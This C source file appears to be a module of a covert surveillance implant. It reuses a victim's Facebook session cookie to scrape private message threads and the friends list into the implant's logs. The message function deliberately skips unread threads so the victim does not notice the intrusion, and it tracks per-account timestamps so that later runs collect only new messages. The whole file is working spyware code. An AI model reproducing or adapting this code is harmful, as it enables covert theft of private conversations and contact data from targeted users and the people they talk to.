#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "..\common.h"
#include "..\LOG.h"
#include "SocialMain.h"
#include "NetworkHandler.h"

#define FB_THREAD_IDENTIFIER "\\/messages\\/?action=read&amp;tid="
#define FB_THREAD_AUTHOR_IDENTIFIER "class=\\\"authors\\\">"
#define FB_THREAD_STATUS_IDENTIFIER "class=\\\"threadRow noDraft "
#define FB_MESSAGE_TSTAMP_IDENTIFIER "data-utime=\\\""
#define FB_MESSAGE_BODY_IDENTIFIER "div class=\\\"content noh\\\" id=\\\""
#define FB_MESSAGE_AUTHOR_IDENTIFIER "\\u003C\\/a>\\u003C\\/strong>"
#define FB_MESSAGE_SCREEN_NAME_ID "\"id\":\"%s\",\"name\":\""
#define FB_NEW_LINE "\\u003Cbr \\/> "
#define FB_POST_FORM_ID "post_form_id\":\""
#define FB_PEER_ID_IDENTIFIER "\"fbid:"
#define FB_DTSG_ID "fb_dtsg\":\""
#define FACEBOOK_THREAD_LIMIT 15
#define MAX_FACEBOOK_ACCOUNTS 500 
#define FB_INVALID_TSTAMP 0xFFFFFFFF

extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
extern BOOL bPM_ContactsStarted; 

extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp

typedef struct {
	char user[48];
	DWORD tstamp_lo;
	DWORD tstamp_hi;
} last_tstamp_struct;
last_tstamp_struct *last_tstamp_array = NULL;

DWORD GetLastFBTstamp(char *user, DWORD *hi_part)
{
	DWORD i;

	if (hi_part)
		*hi_part = FB_INVALID_TSTAMP;

	// Se e' la prima volta che viene chiamato 
	// alloca l'array
	if (!last_tstamp_array) {
		last_tstamp_array = (last_tstamp_struct *)calloc(MAX_FACEBOOK_ACCOUNTS, sizeof(last_tstamp_struct));
		if (!last_tstamp_array)
			return FB_INVALID_TSTAMP;
		Log_RestoreAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
	}
	if (!user || !user[0])
		return FB_INVALID_TSTAMP;

	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
		if (last_tstamp_array[i].user[0] == 0) {
			if (hi_part)
				*hi_part = 0;
			return 0;
		}
		if (!strcmp(user, last_tstamp_array[i].user)) {
			if (hi_part)
				*hi_part = last_tstamp_array[i].tstamp_hi;
			return last_tstamp_array[i].tstamp_lo;
		}
	}
	return FB_INVALID_TSTAMP;
}

void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi)
{
	DWORD i, dummy;

	if (!user || !user[0])
		return;

	if (tstamp_lo==0 && tstamp_hi==0)
		return;

	if (!last_tstamp_array && GetLastFBTstamp(user, &dummy)==FB_INVALID_TSTAMP && dummy==FB_INVALID_TSTAMP)
		return;

	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
		if (last_tstamp_array[i].user[0] == 0)
			break;
		if (!strcmp(user, last_tstamp_array[i].user)) {
			if (tstamp_hi < last_tstamp_array[i].tstamp_hi)
				return;
			if (tstamp_hi==last_tstamp_array[i].tstamp_hi && tstamp_lo<=last_tstamp_array[i].tstamp_lo) 
				return;
			last_tstamp_array[i].tstamp_hi = tstamp_hi;
			last_tstamp_array[i].tstamp_lo = tstamp_lo;
			Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
			return;
		}
	}

	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
		// Lo scrive nella prima entry libera
		if (last_tstamp_array[i].user[0] == 0) {
			_snprintf_s(last_tstamp_array[i].user, 48, _TRUNCATE, "%s", user);		
			last_tstamp_array[i].tstamp_hi = tstamp_hi;
			last_tstamp_array[i].tstamp_lo = tstamp_lo;
			Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
			return;
		}
	}
}

DWORD HandleFBMessages(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	BYTE *r_buffer_inner = NULL;
	DWORD response_len, dummy;
	WCHAR url[256];
	BOOL me_present = FALSE;
	BYTE *parser1, *parser2;
	BYTE *parser_inner1, *parser_inner2;
	WCHAR fb_request[256];
	BOOL is_incoming = FALSE;
	char peers[512];
	char peers_id[256];
	char author[256];
	char author_id[256];
	char tstamp[11];
	DWORD act_tstamp;
	DWORD last_tstamp = 0;
	char *msg_body = NULL;
	DWORD msg_body_size, msg_part_size;
	char user[256];
	char form_id[256];
	char dtsg_id[256];
	char post_data[512];
	char screen_name_tag[256];
	char screen_name[256];

	CheckProcessStatus();

	if (!bPM_IMStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	
	// Identifica l'utente
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 80, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;
	parser1 = (BYTE *)strstr((char *)r_buffer, "\"user\":\"");
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser1 += strlen("\"user\":\"");
	parser2 = (BYTE *)strchr((char *)parser1, '\"');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;
	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);

	// Torna utente "0" se non siamo loggati
	if (!strcmp(user, "0")) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	// Cerca di ricavare lo screen name
	do {
		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "Target");
		_snprintf_s(screen_name_tag, sizeof(screen_name_tag), _TRUNCATE, FB_MESSAGE_SCREEN_NAME_ID, user);
		parser1 = parser2 + 1;
		parser1 = (BYTE *)strstr((char *)parser1, screen_name_tag);
		if (!parser1)
			break;
		parser1 += strlen(screen_name_tag);
		parser2 = (BYTE *)strchr((char *)parser1, '\"');
		if (!parser2)
			break;
		*parser2=0;
		if (strlen((char *)parser1))
			_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser1);
	} while(0);

	SAFE_FREE(r_buffer);

	// Carica dal file il last time stamp per questo utente
	last_tstamp = GetLastFBTstamp(user, NULL);
	if (last_tstamp == FB_INVALID_TSTAMP)
		return SOCIAL_REQUEST_BAD_COOKIE;

	// Costruisce il contenuto per le successive POST ajax
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/messages/", 80, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;
	parser1 = (BYTE *)strstr((char *)r_buffer, FB_POST_FORM_ID);
	if (parser1) {
		parser1 += strlen(FB_POST_FORM_ID);
		parser2 = (BYTE *)strchr((char *)parser1, '\"');
		if (!parser2) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		*parser2=0;
		_snprintf_s(form_id, sizeof(form_id), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;
	} else {
		parser1 = r_buffer;
		memset(form_id, 0, sizeof(form_id));
	}

	parser1 = (BYTE *)strstr((char *)parser1, FB_DTSG_ID);
	if (parser1) {
		parser1 += strlen(FB_DTSG_ID);
		parser2 = (BYTE *)strchr((char *)parser1, '\"');
		if (!parser2) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		*parser2=0;
		_snprintf_s(dtsg_id, sizeof(dtsg_id), _TRUNCATE, "%s", parser1);
	} else {
		memset(dtsg_id, 0, sizeof(dtsg_id));
	}

	SAFE_FREE(r_buffer);
	_snprintf_s(post_data, sizeof(post_data), _TRUNCATE, "post_form_id=%s&fb_dtsg=%s&lsd&post_form_id_source=AsyncRequest&__user=%s&phstamp=145816710610967116112122", form_id, dtsg_id, user);

	// Chiede la lista dei thread
	swprintf_s(fb_request, L"ajax/messaging/async.php?sk=inbox&offset=0&limit=%d&__a=1", FACEBOOK_THREAD_LIMIT);
	ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", fb_request, 80, (BYTE *)post_data, strlen(post_data), &r_buffer, &response_len, cookie);
	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = r_buffer;
	for (;;) {
		CheckProcessStatus();
		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_STATUS_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_THREAD_STATUS_IDENTIFIER);
		// Salta i thread unread per non cambiare il loro stato!!!!
		if(!strncmp((char *)parser1, "unread", strlen("unread")))
			continue;

		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_THREAD_IDENTIFIER);
		parser2 = (BYTE *)strstr((char *)parser1, "\\\" ");
		if (!parser2)
			break;
		*parser2 = 0;
		urldecode((char *)parser1);
		// Se voglio andare piu' indietro aggiungo alla richiesta...per ora pero' va bene cosi'
		// &thread_offset=0&num_msgs=60
		_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/ajax/messaging/async.php?sk=inbox&action=read&tid=%S&__a=1", parser1);
		parser1 = parser2 + 1;

		parser1 = (BYTE *)strstr((char *)parser1, FB_MESSAGE_TSTAMP_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER);
		memset(tstamp, 0, sizeof(tstamp));
		memcpy(tstamp, parser1, 10);
		act_tstamp = atoi(tstamp);
		if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
			continue;

		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_AUTHOR_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_THREAD_AUTHOR_IDENTIFIER);
		parser2 = (BYTE *)strstr((char *)parser1, "\\u003C\\/");
		if (!parser2)
			break;
		*parser2 = 0;
		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "%s, %s", screen_name, parser1);
		parser1 = parser2 + 1;

		// Pe ogni thread chiede tutti i rispettivi messaggi
		ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", url, 80, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &dummy, cookie);
		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
			SAFE_FREE(r_buffer);
			return ret_val;
		}

		// Cerca gli id dei peers
		parser_inner1 = r_buffer_inner;
		memset(peers_id, 0, sizeof(peers_id));
		me_present = FALSE;
		for (;;) {
			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, FB_PEER_ID_IDENTIFIER);
			if (!parser_inner2)
				break;
			parser_inner1 = parser_inner2 + strlen(FB_PEER_ID_IDENTIFIER);
			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, "\"");
			if (!parser_inner2)
				break;
			*parser_inner2 = 0;

			if (!strcmp((CHAR *)parser_inner1, user))
				me_present = TRUE;

			if (strlen(peers_id) == 0)
				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s", parser_inner1);
			else
				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, parser_inner1);
			
			parser_inner1 = parser_inner2 +1;
		}	
		if (!me_present)
			_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, user);

		// Clicla per tutti i messaggi del thread
		for (;;) {			
			CheckProcessStatus();
			parser_inner1 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_TSTAMP_IDENTIFIER);
			if (!parser_inner1)
				break;
			parser_inner1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER);
			memset(tstamp, 0, sizeof(tstamp));
			memcpy(tstamp, parser_inner1, 10);
			act_tstamp = atoi(tstamp);
			if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
				continue;
			SetLastFBTstamp(user, act_tstamp, 0);

			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_AUTHOR_IDENTIFIER);
			if (!parser_inner2)
				break;
			*parser_inner2 = 0;
			parser_inner1 = parser_inner2;
			for (;*(parser_inner1) != '>' && parser_inner1 > r_buffer_inner; parser_inner1--);
			if (parser_inner1 <= r_buffer_inner)
				break;
			parser_inner1++;
			_snprintf_s(author, sizeof(author), _TRUNCATE, "%s", parser_inner1);
			parser_inner1--;
			for (;*(parser_inner1) != '\\' && parser_inner1 > r_buffer_inner; parser_inner1--);
			if (parser_inner1 <= r_buffer_inner)
				break;
			*parser_inner1 = 0;
			for (;*(parser_inner1) != '=' && parser_inner1 > r_buffer_inner; parser_inner1--);
			if (parser_inner1 <= r_buffer_inner)
				break;
			parser_inner1++;
			_snprintf_s(author_id, sizeof(author_id), _TRUNCATE, "%s", parser_inner1);
			parser_inner1 = parser_inner2 + 1;
			
			if (!strcmp(author_id, user))
				is_incoming = FALSE;
			else 
				is_incoming = TRUE;

			// Cicla per tutti i possibili body del messaggio
			SAFE_FREE(msg_body);
			msg_body_size = 0;
			for (;;) {
				BYTE *tmp_ptr1, *tmp_ptr2;
				tmp_ptr1 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_BODY_IDENTIFIER);
				if (!tmp_ptr1)
					break;
				// Non ci sono piu' body (c'e' gia' un nuovo timestamp)
				tmp_ptr2 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_TSTAMP_IDENTIFIER);
				if (tmp_ptr2 && tmp_ptr2<tmp_ptr1)
					break;
				parser_inner1 = tmp_ptr1;
				parser_inner1 = (BYTE *)strstr((char *)parser_inner1, "p>");
				if (!parser_inner1)
					break;
				parser_inner1 += strlen("p>");
				parser_inner2 = (BYTE *)strstr((char *)parser_inner1, "\\u003C\\/p>");
				if (!parser_inner2)
					break;
				*parser_inner2 = 0;

				msg_part_size = strlen((char *)parser_inner1);
				tmp_ptr1 = (BYTE *)realloc(msg_body, msg_body_size + msg_part_size + strlen(FB_NEW_LINE) + sizeof(WCHAR));
				if (!tmp_ptr1)
					break;
				// Se non e' il primo body, accodiamo un "a capo"
				if (msg_body) {
					memcpy(tmp_ptr1 + msg_body_size, FB_NEW_LINE, strlen(FB_NEW_LINE));
					msg_body_size += strlen(FB_NEW_LINE);
				}

				msg_body = (char *)tmp_ptr1;
				memcpy(msg_body + msg_body_size, parser_inner1, msg_part_size);
				msg_body_size += msg_part_size;
				// Null-termina sempre il messaggio
				memset(msg_body + msg_body_size, 0, sizeof(WCHAR));

				parser_inner1 = parser_inner2 + 1;
			}

			// Vede se deve mettersi in pausa o uscire
			CheckProcessStatus();

			if (msg_body) {
				struct tm tstamp;
				_gmtime32_s(&tstamp, (__time32_t *)&act_tstamp);
				tstamp.tm_year += 1900;
				tstamp.tm_mon++;
				JsonDecode(msg_body);
				LogSocialIMMessageA(CHAT_PROGRAM_FACEBOOK, peers, peers_id, author, author_id, msg_body, &tstamp, is_incoming);
				SAFE_FREE(msg_body);
			} else
				break;
		}
		SAFE_FREE(r_buffer_inner);
	}

	SAFE_FREE(r_buffer);
	CheckProcessStatus();

	return SOCIAL_REQUEST_SUCCESS;
}


#define FB_CONTACT_IDENTIFIER "\"user\",\"text\":\""
#define FB_CPATH_IDENTIFIER ",\"path\":\""
#define FB_CATEGORY_IDENTIFIER ",\"category\":\""
#define FB_UID_IDENTIFIER "\"uid\":"
DWORD HandleFBContacts(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2, *parser3;
	WCHAR fb_request[256];
	char user[256];
	WCHAR *name_w, *profile_w, *category_w;
	char contact_name[256];
	char profile_path[256];
	char category[256];
	static BOOL scanned = FALSE;
	HANDLE hfile;
	DWORD flags;

	CheckProcessStatus();

	if (!bPM_ContactsStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	if (scanned)
		return SOCIAL_REQUEST_SUCCESS;
	
	// Identifica l'utente
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 80, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;
	parser1 = strstr((char *)r_buffer, "\"user\":\"");
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser1 += strlen("\"user\":\"");
	parser2 = strchr(parser1, '\"');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;
	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
	SAFE_FREE(r_buffer);

	// Torna utente "0" se non siamo loggati
	if (!strcmp(user, "0"))
		return SOCIAL_REQUEST_BAD_COOKIE;

	// Chiede la lista dei contatti
	_snwprintf_s(fb_request, sizeof(fb_request)/sizeof(WCHAR), _TRUNCATE, L"/ajax/typeahead/first_degree.php?__a=1&viewer=%S&token=v7&filter[0]=user&options[0]=friends_only&__user=%S", user, user);
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", fb_request, 80, NULL, 0, &r_buffer, &response_len, cookie);
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	CheckProcessStatus();
	parser1 = (char *)r_buffer;
	
	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
	for (;;) {
		flags = 0;
		parser1 = strstr(parser1, FB_UID_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_UID_IDENTIFIER);
		parser2 = strchr(parser1, ',');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(profile_path, sizeof(profile_path), _TRUNCATE, "%s", parser1);
		if (!strcmp(user, parser1))
			flags |= CONTACTS_MYACCOUNT;
		parser1 = parser2 + 1;

		parser1 = strstr(parser1, FB_CONTACT_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_CONTACT_IDENTIFIER);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(contact_name, sizeof(contact_name), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		parser1 = strstr(parser1, FB_CPATH_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_CPATH_IDENTIFIER);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		//_snprintf_s(profile_path, sizeof(profile_path), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		// Verifica se c'e' category
		category[0]=NULL;
		parser2 = strstr(parser1, FB_CATEGORY_IDENTIFIER);
		if (parser2) {
			parser3 = strstr(parser1, FB_CONTACT_IDENTIFIER);
			if (!parser3 || parser3>parser2) {
				parser1 = parser2;
				parser1 += strlen(FB_CATEGORY_IDENTIFIER);
				parser2 = strchr(parser1, '\"');
				if (!parser2)
					break;
				*parser2 = NULL;
				_snprintf_s(category, sizeof(category), _TRUNCATE, "%s", parser1);
				parser1 = parser2 + 1;
			}
		}
		JsonDecode(contact_name);
		JsonDecode(profile_path);
		JsonDecode(category);

		name_w = UTF8_2_UTF16(contact_name);
		profile_w = UTF8_2_UTF16(profile_path);
		category_w = UTF8_2_UTF16(category);

		if (profile_w[0] == L'/') // Toglie lo / dalla facebook page
			DumpContact(hfile, CONTACT_SRC_FACEBOOK, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w+1, flags);
		else
			DumpContact(hfile, CONTACT_SRC_FACEBOOK, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w, flags);
		
		SAFE_FREE(name_w);
		SAFE_FREE(profile_w);
		SAFE_FREE(category_w);
	}
	Log_CloseFile(hfile);

	scanned = TRUE;
	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}
